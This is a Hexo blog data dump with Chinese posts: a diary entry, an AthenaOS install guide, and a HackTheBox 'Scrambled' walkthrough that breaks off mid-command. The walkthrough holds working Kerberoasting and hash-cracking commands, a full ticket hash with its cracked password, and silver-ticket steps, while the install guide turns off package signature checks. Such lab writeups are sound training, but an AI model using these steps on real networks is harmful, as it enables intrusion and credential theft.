{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-06-19T13:38:40.005Z","updated":"2025-06-19T13:38:40.005Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"随想0409&&涩话0411","slug":"随想0409/随想0409","date":"2025-06-19T13:59:05.171Z","updated":"2025-06-19T13:59:05.171Z","comments":true,"path":"2025/06/19/随想0409/随想0409/","permalink":"http://example.com/2025/06/19/%E9%9A%8F%E6%83%B30409/%E9%9A%8F%E6%83%B30409/","excerpt":"","text":"今天，累死。 上午当了一回甲方，全程感觉自己小丑表现； 下午修服务器，紧修慢修不用加班了。 已经一整天没有打WhiteRabbit了。但是一整天也不是没有学习，学了一会kubernetes（基础的），也学了一会怎么排查。晚上回家直接躺尸，脑子胀胀的，眼睛酸酸的，只能缓一下再学习。 笑死，隔了两天，分手了来的意料之外情理之中，只能祝好 感情马上就五年了，但是再过下去可能对两个人伤害更大更深，也挽留也不舍，没能改变什么结果。晚上听张震岳的《小宇》，深深陷入了空白。也加上最近事情多，心如乱麻都不知该先想那件事，还好下午解决了工作上的事情，但是反应过来就要接受感情的结果了。 现在坐在电脑跟前，相识相知又相互折磨的时光，就像有剪刀一样，剪出一张张画面，幻灯片一样在脑海里划过。人家自始至终都对我很好，对我很包容也很关爱，奈何我就像长不大的孩子，让人家教了一遍又一遍，就是教不会。可能真是从小老师教就没用，还是得我自己学才学的快，成长，也是一张内我的修行。 今天领导也说我想起来一出不止一出，什么都想当然，这让我也局限于自己的思维，按照以往经验做事，最终也会让自己身陷漩涡，希望自己能够涨涨记性，不只是工作上，感情上也是。接下来希望自己能真正学会脚踏实地，多思多问，，，就说这么多吧。hf今天下了雨，来一首eason的《阴天快乐》吧","categories":[],"tags":[{"name":"random","slug":"random","permalink":"http://example.com/tags/random/"}]},{"title":"部分之前的WP","slug":"部分之前的WP/部分之前的WP","date":"2025-06-19T13:59:05.167Z","updated":"2025-06-19T13:59:05.167Z","comments":true,"path":"2025/06/19/部分之前的WP/部分之前的WP/","permalink":"http://example.com/2025/06/19/%E9%83%A8%E5%88%86%E4%B9%8B%E5%89%8D%E7%9A%84WP/%E9%83%A8%E5%88%86%E4%B9%8B%E5%89%8D%E7%9A%84WP/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 部分之前的wp些许wp放在了这里 -&gt; FlowUS 辛苦佬✌们多多关注：）","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"无脑AthenaOS安装","slug":"无脑AthenaOS安装/无脑AthenaOS安装","date":"2025-06-19T13:59:05.163Z","updated":"2025-06-19T13:59:05.163Z","comments":true,"path":"2025/06/19/无脑AthenaOS安装/无脑AthenaOS安装/","permalink":"http://example.com/2025/06/19/%E6%97%A0%E8%84%91AthenaOS%E5%AE%89%E8%A3%85/%E6%97%A0%E8%84%91AthenaOS%E5%AE%89%E8%A3%85/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 此处省略虚拟机配鉴于个人pc情况分配资源 以下为正式安装前的准备工作这个界面可以先关掉，最后安装的时候再打开 打开terminal目前系统只有alacritty这一个如果运行sudo pacman -Sy的话，会发现一下问题 1234567athena 398.9 KiB 70.3 KiB/s 00:06 [##############################################################################] 100% core 116.0 KiB 30.3 KiB/s 00:04 [##############################################################################] 100% extra 4.7 MiB 109 KiB/s 00:26 [################################################------------------------------] 62% multilib 131.6 KiB 17.0 KiB/s 00:08 [##############################################################################] 100% chaotic-aur 650.8 KiB 95.3 KiB/s 00:07 [##############################################################################] 100%:: Replace sdl2 with extra/sdl2-compat? [Y/n] 接着往下会发现点问题 一是chaotic-aur这个软件源，如果只使用现有的，基本上就会出现timeout，这里可以修改一下 123[chaotic-aur]SigLevel = NeverServer = https://geo-mirror.chaotic.cx/$repo/x86_64 二是密钥验证，这个问题也是最麻烦的（我眼里是嗷。。。） 1234#我这里省事的办法就是不进行密钥验证，但是会不安全，所以谨慎使用#修改/etc/pacman.conf中SigLevel = Never#LocalFileSigLevel = Optional 然后再sudo pacman -Sy，这样更新就顺畅多了 安装proxychains-ng123456789101112131415161718192021222324sudo pacman -S proxychainsresolving dependencies...looking for conflicting packages...Packages (1) proxychains-ng-4.17-2Total Download Size: 0.03 MiBTotal Installed Size: 0.08 MiB:: Proceed with installation? [Y/n] y:: Retrieving packages... proxychains-ng-4.17-2-x86_64 29.5 KiB 12.3 KiB/s 00:02 [#####################################################################] 100%(1/1) checking keys in keyring [#####################################################################] 100%(1/1) checking package integrity [#####################################################################] 100%(1/1) loading package files [#####################################################################] 100%(1/1) checking for file conflicts [#####################################################################] 100%(1/1) checking available disk space [#####################################################################] 100%:: Processing package changes...(1/1) installing proxychains-ng [#####################################################################] 100%:: Running post-transaction hooks...(1/1) Arming ConditionNeedsUpdate...#修改配置文件sudo nano /etc/proxychains.conf 挂上代理之后更新会快很多 1234(17/18) #### Important Linux packages have changed. Reboot is recommended. ####[proxychains] DLL init: proxychains-ng 4.17(18/18) Updating the desktop file MIME type cache...[proxychains] DLL init: proxychains-ng 4.17 更新完成 解析github地址这里需要解析一下GitHub地址，不然会出现timeout的情况编辑&#x2F;etc&#x2F;hosts，Google一下域名解析，可以随便找一个网站，分别解析一下github.com和raw.githubusercontent.com两个 12github.com 20.205.243.166raw.githubusercontent.com 185.199.110.133 接下来就可以安装了 正式安装Athena-welcome其实是aegis-tui，直接sudo运行 1sudo proxychains aegis-tui 会直接进入这个页面，然后按照正常需要选择这里以arch为例第一个地区选上海第二个第三个keymap选us好了第四个console字体可以先选en_US,zh_CN的话可以后面自己再装,选的时候选UTF-8第五第六第七创建用户名密码自己建第八个yesno自己选第九个hostname可以直接回车第十个选抹了磁盘回车三次到选大小推荐2G+第十四步看个人需要加密剩下的主题看个人最后如下（我的）：回车安装就行了 可能遇到的问题12[ INFO ] 23:02:29 Populate keys[ INFO ] 23:02:29 Getting fastest Arch and Chaotic AUR mirrors for your location 到这会卡一下，正常等一等 12[ ERROR ] 14:20:43 The package manager failed with exit code: 1[ ERROR ] 14:20:43 Set available cores on MAKEFLAGS ERROR: No such file or directory (os error 2) 出现这个错误正常现象，重新装就好了;其实可以看错误说包管理出错了，直接ctrl+c，然后pacman -Syyu看看是否还正常，不正常就Google一下;有啥错误直接重装一下，里面的那些细节需要自己慢慢研究。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——Tracks AD Scrambled","slug":"Scrambled/HackTheBox——Tracks AD Scrambled","date":"2025-06-19T13:59:05.111Z","updated":"2025-06-19T13:59:05.111Z","comments":true,"path":"2025/06/19/Scrambled/HackTheBox——Tracks AD Scrambled/","permalink":"http://example.com/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Scramble Corp Intranet 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-05 07:59:07Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-05T08:02:44+00:00; -57s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC1.scrm.local | Not valid before: 2024-09-04T11:14:45 |_Not valid after: 2121-06-08T22:39:53 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC1.scrm.local | Not valid before: 2024-09-04T11:14:45 |_Not valid after: 2121-06-08T22:39:53 |_ssl-date: 2025-05-05T08:02:44+00:00; -56s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ms-sql-info: ERROR: Script execution failed (use -d to debug) |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug) |_ssl-date: 2025-05-05T08:02:45+00:00; -56s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2025-05-05T07:45:38 |_Not valid after: 2055-05-05T07:45:38 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-05T08:02:44+00:00; -57s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC1.scrm.local | Not valid before: 2024-09-04T11:14:45 |_Not valid after: 2121-06-08T22:39:53 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-05T08:02:44+00:00; -56s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC1.scrm.local | Not valid before: 2024-09-04T11:14:45 |_Not valid after: 2121-06-08T22:39:53 4411/tcp open found? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3; |_ ERROR_UNKNOWN_COMMAND; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49700/tcp open msrpc Microsoft Windows RPC 55408/tcp open msrpc Microsoft Windows RPC 55433/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4411-TCP:V=7.95%I=7%D=5/5%Time=68187003%P=x86_64-pc-linux-gnu%r(NUL SF:L,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(GenericLines,1D,&quot;SCRAMBLECO SF:RP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(GetRequest,35,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3 SF:;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n&quot;)%r(HTTPOptions,35,&quot;SCRAMBLECORP_ORDERS SF:_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n&quot;)%r(RTSPRequest,35,&quot;SCRAMBLECO SF:RP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n&quot;)%r(RPCCheck,1D,&quot;SCRA SF:MBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(DNSVersionBindReqTCP,1D,&quot;SCRAMBLECORP SF:_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(DNSStatusRequestTCP,1D,&quot;SCRAMBLECORP_ORDERS_V SF:1\\.0\\.3;\\r\\n&quot;)%r(Help,35,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOW SF:N_COMMAND;\\r\\n&quot;)%r(SSLSessionReq,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot; SF:)%r(TerminalServerCookie,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(TLSS SF:essionReq,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(Kerberos,1D,&quot;SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(SMBProgNeg,1D,&quot;SCRAMBLECORP_ORDERS_V1\\. SF:0\\.3;\\r\\n&quot;)%r(X11Probe,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(FourOh SF:FourRequest,35,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND; SF:\\r\\n&quot;)%r(LPDString,35,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_C SF:OMMAND;\\r\\n&quot;)%r(LDAPSearchReq,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r SF:(LDAPBindReq,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(SIPOptions,35,&quot;S SF:CRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n&quot;)%r(LANDesk- SF:RC,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(TerminalServer,1D,&quot;SCRAMBL SF:ECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(NCP,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\ SF:n&quot;)%r(NotesRPC,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(JavaRMI,1D,&quot;SC SF:RAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(WMSRequest,1D,&quot;SCRAMBLECORP_ORDERS_ SF:V1\\.0\\.3;\\r\\n&quot;)%r(oracle-tns,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r( SF:ms-sql-s,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(afp,1D,&quot;SCRAMBLECORP SF:_ORDERS_V1\\.0\\.3;\\r\\n&quot;)%r(giop,1D,&quot;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n&quot;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019|10 (97%) OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2025-05-05T08:02:08|_ start_date: N/A|_clock-skew: mean: -56s, deviation: 0s, median: -56s 先把scrm.local加到hosts里面smb没出东西ldap： 1234567891011121314151617181920212223242526272829303132333435363738394041$ ldapsearch -H &#x27;ldap://10.10.11.168&#x27; -x -s base # extended LDIF # # LDAPv3 # base &lt;&gt; (default) with scope baseObject# filter: (objectclass=*)# requesting: ALL##dn:domainFunctionality: 7forestFunctionality: 7domainControllerFunctionality: 7rootDomainNamingContext: DC=scrm,DC=localldapServiceName: scrm.local:dc1$@SCRM.LOCALisGlobalCatalogReady: TRUEsupportedSASLMechanisms: GSSAPIsupportedSASLMechanisms: GSS-SPNEGOsupportedSASLMechanisms: EXTERNALsupportedSASLMechanisms: DIGEST-MD5supportedLDAPVersion: 3supportedLDAPVersion: 2。。。subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=scrm,DC=localserverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura tion,DC=scrm,DC=localschemaNamingContext: CN=Schema,CN=Configuration,DC=scrm,DC=localnamingContexts: DC=scrm,DC=localnamingContexts: CN=Configuration,DC=scrm,DC=localnamingContexts: CN=Schema,CN=Configuration,DC=scrm,DC=localnamingContexts: DC=DomainDnsZones,DC=scrm,DC=localnamingContexts: DC=ForestDnsZones,DC=scrm,DC=localisSynchronized: TRUEhighestCommittedUSN: 290952dsServiceName: CN=NTDS Settings,CN=DC1,CN=Servers,CN=Default-First-Site-Name,C N=Sites,CN=Configuration,DC=scrm,DC=localdnsHostName: DC1.scrm.localdefaultNamingContext: DC=scrm,DC=localcurrentTime: 20250505080737.0ZconfigurationNamingContext: CN=Configuration,DC=scrm,DC=local 把dc1.scrm.local也加到hosts里面去然后也没啥 80 webindex页没啥IT Services倒是有可以都看一下 12345678910111213141516# news and alerts04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues2021年4月9日：由于上个月的安全漏洞，我们现已禁用网络上的所有 NTLM 身份验证。这可能会导致您使用的某些程序出现问题，因此请耐心等待，我们正在努力解决问题。# Contacting IT Support具体见下图示一# New User Account具体见下图示二# Sales Orders App Troubleshooting具体见下图示三# Password ResetsOur self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.我们的自助密码重置系统即将上线运行，在此期间，请致电IT支持热线，我们将为您重置密码。如果无人接听，请留言告知您的用户名，我们将重置您的密码，使其与用户名一致。 综上可以得到以下信息 1.系统存在安全漏洞，范围在2021年3月左右 2.有一个用户ksimpson 3.可以注册用户，选项中有administrator 4.4411端口存在一个应用，跟日志有关系应该 5.重置密码的话就会跟用户名一样 ksimpson user logon smb那有没有可能ksimpson的用户名和密码都有了，试一下用impacket，nxc也可以，加一个-k，target设置为dc1.scrm.local 123456789101112131415161718192021222324252627282930313233343536373839404142$ smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local Impacket v0.11.0 - Copyright 2023 Fortra # help open &#123;host,port=445&#125; - opens a SMB connection against the target host/port login &#123;domain/username,passwd&#125; - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it&#x27;ll be prompted kerberos_login &#123;domain/username,passwd&#125; - logs into the current SMB connection using Kerberos. If no password specified, it&#x27;ll be prompted. Use the DNS resolvable domain name login_hash &#123;domain/username,lmhash:nthash&#125; - logs into the current SMB connection using the password hashes logoff - logs off shares - list available shares use &#123;sharename&#125; - connect to an specific share cd &#123;path&#125; - changes the current directory to &#123;path&#125; lcd &#123;path&#125; - changes the current local directory to &#123;path&#125; pwd - shows current remote directory password - changes the user password, the new password will be prompted for input ls &#123;wildcard&#125; - lists all the files in the current directory lls &#123;dirname&#125; - lists all the files on the local filesystem. tree &#123;filepath&#125; - recursively lists all files in folder and sub folders rm &#123;file&#125; - removes the selected file mkdir &#123;dirname&#125; - creates the directory under the current path rmdir &#123;dirname&#125; - removes the directory under the current path put &#123;filename&#125; - uploads the filename into the current path get &#123;filename&#125; - downloads the filename from the current path mget &#123;mask&#125; - downloads all files from the current directory matching the provided mask cat &#123;filename&#125; - reads the filename from the current path mount &#123;target,path&#125; - creates a mount point from &#123;path&#125; to &#123;target&#125; (admin required) umount &#123;path&#125; - removes the mount point at &#123;path&#125; without deleting the directory (admin required) list_snapshots &#123;path&#125; - lists the vss snapshots for the specified path info - returns NetrServerInfo main results who - returns the sessions currently connected at the target host (admin required) close - closes the current SMB Session exit - terminates the server process (and this session)# shares ADMIN$ C$ HR IPC$ITNETLOGONPublicSalesSYSVOL 枚举一下 1234567891011121314151617181920212223242526272829303132333435363738# 其他共享目录进不去，只有Public# use Public# sharesADMIN$C$HRIPC$ITNETLOGONPublicSalesSYSVOL# lsdrw-rw-rw- 0 Fri Nov 5 06:23:19 2021 .drw-rw-rw- 0 Fri Nov 5 06:23:19 2021 ..-rw-rw-rw- 630106 Sat Nov 6 01:45:07 2021 Network Security Changes.pdf# use HR[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)# use IT[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)# use NETLOGON# lsdrw-rw-rw- 0 Mon Jan 27 03:14:20 2020 .drw-rw-rw- 0 Mon Jan 27 03:14:20 2020 ..# use Sales[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)# use SYSVOL# lsdrw-rw-rw- 0 Mon Jan 27 03:14:20 2020 .drw-rw-rw- 0 Mon Jan 27 03:14:20 2020 ..drw-rw-rw- 0 Mon Jan 27 03:14:20 2020 scrm.local# cd scrm.local# lsdrw-rw-rw- 0 Mon Jan 27 03:21:22 2020 .drw-rw-rw- 0 Mon Jan 27 03:21:22 2020 ..drw-rw-rw- 0 Mon May 5 15:49:38 2025 DfsrPrivatedrw-rw-rw- 0 Thu Nov 4 05:58:57 2021 Policiesdrw-rw-rw- 0 Mon Jan 27 03:14:20 2020 scripts 有一个PDF文件，下载下来看看 123456789101112131415161718192021222324As you may have heard, our network was recently compromised and an attacker was able to accessall of our data. We have identified the way the attacker was able to gain access and have made some immediate changes. You can find these listed below along with the ways these changes may impact you.您可能已经听说，我们的网络最近遭到入侵，攻击者成功访问了我们的所有数据。我们已经确定了攻击者获取访问权限的方式，并立即采取了一些措施。您可以在下面找到这些措施以及这些措施可能对您造成的影响。Change: As the attacker used something known as &quot;NTLM relaying&quot;, we have disabled NTLM authentication across the entire network.变更：由于攻击者使用了所谓的“NTLM 中继”，我们已在整个网络中禁用 NTLM 身份验证。Workaround: When you log on or access network resources you will now be using Kerberosauthentication (which is definitely 100% secure and has absolutely no way anyone could exploit it).This will require you to use the full domain name (scrm.local) with your username and any servernames you access. 解决方法：当您登录或访问网络资源时，您将使用 Kerberos 身份验证（该身份验证绝对 100% 安全，绝对不可能被任何人利用）。这将要求您在用户名和您访问的任何服务器名称中使用完整的域名 (scrm.local)。Change: The attacker was able to retrieve credentials from an SQL database used by our HR softwareso we have removed all access to the SQL service for everyone apart from network administrators.Users impacted: HR departmentWorkaround: If you can no longer access the HR software please contact us and we will manuallygrant your account access again.变更：攻击者能够从我们人力资源软件使用的 SQL 数据库中检索凭据。因此，我们已移除除网络管理员外所有人对 SQL 服务的访问权限。受影响用户：人力资源部门解决方法：如果您无法再访问人力资源软件，请联系我们，我们将手动重新授予您的帐户访问权限。 kerberoasting get sqlsvc hash我们有一个creds了，而系统目前只能进行kerberos认证，可以进行Kerberoasting攻击 1234567891011121314$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -requestImpacket v0.11.0 - Copyright 2023 Fortra[-] CCache file is not found. Skipping...[-] CCache file is not found. Skipping...ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------ -------- -------------------------- -------------------------- ----------MSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021-11-04 00:32:02.351452 2025-05-05 15:45:37.239329 MSSQLSvc/dc1.scrm.local sqlsvc 2021-11-04 00:32:02.351452 2025-05-05 15:45:37.239329 [-] CCache file is not found. Skipping...$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$5999b9e80110c8ff442806c201900d38$2ab656f4463c6f6a1518cd2af5584223a6ac10828a4f0ed0bd9e6e38eee3707ca0da234e4db979c89539740ca6082521039df43cbe1e7d2d836c4cb4f8840681dd11db4350942cdee9bb040e49482929e1b58a894f616b21b971e4fbe5b2a54d296c5caf475240e7a531eb518c0af5b91d94a5ab1e2a2fcbdcc86245bc9c85a9b9bef81e1a0121a2b1ed1dbd912ee23663d91b4046323fbeebe1d29dd507f051eb38a95ae8ec1b8698664ca724aebe5c4c0012d3dff0ca7ba73b9effe3b9c8e76839be65e8922e4884ae674e2c0aa949f33e8f879214abb805534e81de838dacdbbd84b63471b59c06efc4b302b1558f0da68bdea0b2fccdd2ccbbf943788bd1862dfbd702e9f4f69d6d2f7f22a621cbc3fbf310b376111c6eb149c97730a2270bd29a3e5d1b47517bd4d360264298366815c23a0fda438e3b4acbb3943ab101225cc07375104e64f9e899724a54526df04c786191dddcf243aa9bf167a589fee1e6ab0b86a4501e7ed317724d82e1abfc15083bfb5656adfd837749dc7ab7ee5b6ac7e3b8002fc78accedd26ebeea6df978d056bbc67a0d7363656a9a542e76385c8ae0f931e03314c92c966faac59be49f90f4576e0a76ae260db6d20f0174b95ee94cd67bcf46a511f0f67d14e2c53601964a886edbe34d1700462944e71234735eed6506880204379c9f137cce758532c4861a2c75d9ec376133d84944c60d68eb767cd5b0bb0abc86326f6b549f54009173898ce9e9de93fdf315376f58258d8b8f44b900d188b098cdf7b3ae4e3689abe02580afa086a1044b1373899a6578cfd35de299bf8562bf0ac74550663d260c79baca36c68b14b6fd9ea910d6e52c3414e88aa63c8e5cf7f88edf54673ee56a789b2b8a38e1fa0a62982a3273c35c5a31728e8a31e6be00e5c89d51476766b74da7bf822d46394e223c7d936308658029ebcfcb487ad2f28050d4d1c7384efe036e7be3f2c94c985fcc4f05998379aefb8e176f5cc75e2cda2d0455373b0f5d4d50b4a1956ceef8705332bff82aade8be270877fd5e4eb11d76cf2a5aa249b5533915d2c6f66aba8ca9932f4090476dde1b51c1c96367fc03e072f29bb4ada026dc0d373fa1784ab21c1bf73860c9fb7838f56c3ed98f1e95390ba43ea1c914aaa61e6bbb3dcd7446f9f5d647fb2bfb99a807d559fd4d01a1a47c8b54afea90af289b7ad2a071c214ca5bc5c76d80c93d3e9ec5172259a032251e0d140d82d9fe0b8999f6e8d412b12f989a1cdbaa0f4963933fe4ac0d7081498a6f576083fe4df1563f24dbbaf03bdeadbacc18b083639d86940e038c2a040ed329b8663e8f3952c13ec8e76abdc836604ca5049a17adce47964e66592a3e27632f0b947d283b14fde5de56fb01ebc74b85f5066d941a88a4111c0b58be0d2f8b17625b4ee80b0c544923daf6a8 crack一下 12$ hashcat -a 0 -m 13100 hash /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$5999b9e80110c8ff442806c201900d38$2ab656f4463c6f6a1518cd2af5584223a6ac10828a4f0ed0bd9e6e38eee3707ca0da234e4db979c89539740ca6082521039df43cbe1e7d2d836c4cb4f8840681dd11db4350942cdee9bb040e49482929e1b58a894f616b21b971e4fbe5b2a54d296c5caf475240e7a531eb518c0af5b91d94a5ab1e2a2fcbdcc86245bc9c85a9b9bef81e1a0121a2b1ed1dbd912ee23663d91b4046323fbeebe1d29dd507f051eb38a95ae8ec1b8698664ca724aebe5c4c0012d3dff0ca7ba73b9effe3b9c8e76839be65e8922e4884ae674e2c0aa949f33e8f879214abb805534e81de838dacdbbd84b63471b59c06efc4b302b1558f0da68bdea0b2fccdd2ccbbf943788bd1862dfbd702e9f4f69d6d2f7f22a621cbc3fbf310b376111c6eb149c97730a2270bd29a3e5d1b47517bd4d360264298366815c23a0fda438e3b4acbb3943ab101225cc07375104e64f9e899724a54526df04c786191dddcf243aa9bf167a589fee1e6ab0b86a4501e7ed317724d82e1abfc15083bfb5656adfd837749dc7ab7ee5b6ac7e3b8002fc78accedd26ebeea6df978d056bbc67a0d7363656a9a542e76385c8ae0f931e03314c92c966faac59be49f90f4576e0a76ae260db6d20f0174b95ee94cd67bcf46a511f0f67d14e2c53601964a886edbe34d1700462944e71234735eed6506880204379c9f137cce758532c4861a2c75d9ec376133d84944c60d68eb767cd5b0bb0abc86326f6b549f54009173898ce9e9de93fdf315376f58258d8b8f44b900d188b098cdf7b3ae4e3689abe02580afa086a1044b1373899a6578cfd35de299bf8562bf0ac74550663d260c79baca36c68b14b6fd9ea910d6e52c3414e88aa63c8e5cf7f88edf54673ee56a789b2b8a38e1fa0a62982a3273c35c5a31728e8a31e6be00e5c89d51476766b74da7bf822d46394e223c7d936308658029ebcfcb487ad2f28050d4d1c7384efe036e7be3f2c94c985fcc4f05998379aefb8e176f5cc75e2cda2d0455373b0f5d4d50b4a1956ceef8705332bff82aade8be270877fd5e4eb11d76cf2a5aa249b5533915d2c6f66aba8ca9932f4090476dde1b51c1c96367fc03e072f29bb4ada026dc0d373fa1784ab21c1bf73860c9fb7838f56c3ed98f1e95390ba43ea1c914aaa61e6bbb3dcd7446f9f5d647fb2bfb99a807d559fd4d01a1a47c8b54afea90af289b7ad2a071c214ca5bc5c76d80c93d3e9ec5172259a032251e0d140d82d9fe0b8999f6e8d412b12f989a1cdbaa0f4963933fe4ac0d7081498a6f576083fe4df1563f24dbbaf03bdeadbacc18b083639d86940e038c2a040ed329b8663e8f3952c13ec8e76abdc836604ca5049a17adce47964e66592a3e27632f0b947d283b14fde5de56fb01ebc74b85f5066d941a88a4111c0b58be0d2f8b17625b4ee80b0c544923daf6a8:Pegasus60 这样就得到一个sqlsvc:Pegasus60，但是我们也不可以ntlm，得弄到他的hash通过一个在线工具（Google一下ntlm hash generator），这里用Ntlm hash虽然有mssql端口打开，但是尝试未果有了hash，尝试搞一张银票要搞银票需要拿到SID（powerview也可以拿到sid） 12$ getPac.py scrm.local/sqlsvc -targetUser administrator -hashes 